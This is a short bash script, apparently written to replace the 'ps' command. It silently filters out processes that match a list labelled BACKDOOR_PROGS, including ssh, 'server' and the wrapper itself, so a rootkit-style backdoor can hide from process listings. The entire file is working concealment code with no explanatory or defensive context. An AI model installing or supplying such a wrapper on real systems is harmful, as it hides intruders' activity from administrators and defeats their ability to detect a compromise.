#!/bin/bash

BACKDOOR_PROGS=("ssh" "server" "fish" "grep" "ps_wrapper.sh")

cmd="ps"

for pattern in "${BACKDOOR_PROGS[@]}"; do
    cmd+=" | grep -v '$pattern'" 
done

eval "$cmd"
